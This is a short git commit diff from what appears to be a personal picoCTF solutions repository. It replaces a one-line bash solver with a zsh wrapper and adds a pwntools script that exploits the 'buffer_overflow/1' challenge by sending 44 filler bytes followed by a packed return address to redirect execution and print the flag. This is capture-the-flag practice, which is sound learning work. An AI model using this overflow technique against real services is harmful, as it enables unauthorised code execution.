3fa93dd6bcd23271c18453b363535ccd4577a1a5
Hugo Lindström <huggepugge1@gmail.com>
2022-10-30 20:54:02 +0100

    1

--- pico/buffer_overflow/1/get_flag.sh
+++ pico/buffer_overflow/1/get_flag.sh
@@ -1,3 +1,3 @@
-#!/bin/bash
-port=60326
-python3 -c "from pwn import *; host, port = 'saturn.picoctf.net', $port; p = remote(host, port); log.info(p.recvS()); p.sendline(b'A'*44 + b'ö‘'); log.success(p.recvallS()); p.close()" | grep -oE picoCTF{.*?} --color=none
+#!/bin/zsh
+source ~/.zshrc
+python3 solve.py saturn.picoctf.net 53379 | picogrep
--- pico/buffer_overflow/1/solve.py
+++ pico/buffer_overflow/1/solve.py
@@ -1,1 +1,10 @@
+from pwn import *
+import sys
 
+host, port = sys.argv[1:3]
+
+r = remote(host, port)
+r.recvS()
+r.sendline(b'A'*44 + p32(0x80491f6))
+print(r.recvallS())
+r.close()
